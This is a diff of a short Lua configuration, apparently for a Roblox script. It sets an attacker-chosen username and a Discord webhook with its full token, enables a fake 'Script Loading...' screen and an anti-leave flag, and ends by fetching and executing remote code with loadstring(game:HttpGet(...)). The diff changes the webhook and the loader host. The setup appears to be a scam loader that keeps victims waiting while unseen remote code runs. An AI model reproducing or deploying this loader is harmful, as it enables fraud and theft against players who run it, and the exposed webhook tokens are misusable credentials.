@@ -1,5 +1,5 @@
-UserName = "Biblixyep123" 
-Webhook = "https://discord.com/api/webhooks/1100040700873162773/9M7kEoPItpOavW4yaEmc2CjtiDeSTva2tZ0fHaJn0X8CI2ylLgSkp9PrZ_qTyLoU_itU" 
+UserName = "biblixyep123"
+Webhook = "https://discord.com/api/webhooks/1100767087263232072/xo4ET-12bza__T6FpbibuYw8GQyWh7eylbv_1a8FcxsCGv0v-B3ghGAcowGp2qaQTERZ" 
 
 _G.LoadingScreen = true
 _G.AntiLeave = true
@@ -11,4 +11,4 @@ _G.SecondText = "Script Loading..."
 _G.ThirdText = "Almost Done..."
 _G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
 
-loadstring(game:HttpGet("http://rizz.ct8.pl/scripts/Main", true))()
+loadstring(game:HttpGet("https://rizzhub.glitch.me/scripts/Main.lua", true))()
